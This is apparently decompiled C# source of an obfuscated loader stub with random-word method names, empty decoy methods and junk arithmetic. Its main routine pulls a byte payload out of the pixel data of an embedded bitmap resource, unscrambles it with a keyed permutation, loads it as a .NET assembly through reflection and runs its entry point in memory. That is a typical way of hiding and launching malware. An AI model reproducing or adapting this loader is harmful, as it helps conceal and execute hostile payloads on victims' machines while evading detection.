using System;
using System.Drawing;
using System.Reflection;
using System.Resources;

namespace DefectiveEffective;

internal static class DefectiveEffective
{
	private static string FixerDamascus()
	{
		return "ConcordanceDomiciliary.Properties.Resources";
	}

	private static void FlopperFormat()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		ResourceManager resourceManager = new ResourceManager(FixerDamascus(), typeof(DefectiveEffective).Assembly);
		Bitmap val = (Bitmap)resourceManager.GetObject("ConnectionsDistributing");
		int num = 681;
		num = 1358;
		int num2 = 0;
		int num3 = 78;
		int num4 = 80;
		Color[] array = new Color[6240];
		for (int i = 0; i < num4; i++)
		{
			num += 489;
			for (int j = 0; j < num3; j++)
			{
				num += 360;
				ref Color reference = ref array[num2++];
				reference = val.GetPixel(j, i);
				num += 957;
			}
		}
		byte[] array2 = new byte[num2 * 3];
		int num5 = 0;
		for (int k = 0; k < num2; k++)
		{
			array2[num5++] = array[k].B;
			array2[num5++] = array[k].G;
			array2[num5++] = array[k].R;
		}
		CalligraphyDumper(array2, 8748, 305626118u, 0);
		Type type = Type.GetType(ConnotationsFlank());
		MethodInfo method = type.GetMethod("Load", new Type[1] { typeof(byte[]) });
		Assembly assembly = (Assembly)method.Invoke(null, new object[1] { array2 });
		assembly.EntryPoint!.Invoke(null, new object[0]);
	}

	private static string ConnotationsFlank()
	{
		string text = "System.Reflection";
		return text + ".Assembly";
	}

	private static void EmissionCarabinieri()
	{
	}

	private static void CalligraphyDumper(byte[] FacilitativeFactorisation, int DisentanglingClient, uint CarbonicGallows, int DoublecrossingCheckmate)
	{
		for (int num = DisentanglingClient; num != 0; num--)
		{
			int num2 = (int)(CarbonicGallows % (uint)DisentanglingClient);
			byte b = FacilitativeFactorisation[num2];
			FacilitativeFactorisation[num2] = FacilitativeFactorisation[num - 1];
			FacilitativeFactorisation[num - 1] = b;
			CarbonicGallows = (CarbonicGallows >> 25) | (CarbonicGallows << 7);
			CarbonicGallows -= (uint)DisentanglingClient;
			CarbonicGallows -= 1234012339;
			CarbonicGallows -= 555551;
		}
	}

	private static void ErectingEncamp()
	{
	}

	private static void Main()
	{
		FlopperFormat();
	}

	private static void EntrailsConclusion()
	{
	}

	private static void CollaborativeExploders()
	{
	}

	private static void DominantDoor()
	{
	}

	private static void ClosetedDroplets()
	{
	}

	private static void FragranceChequers()
	{
	}

	private static void DistillingConsents()
	{
	}

	private static void DepreciatedCarve()
	{
	}

	private static void DialecticsFreemen()
	{
	}

	private static void CessionChancing()
	{
	}

	private static void ChippingsExtensors()
	{
	}
}
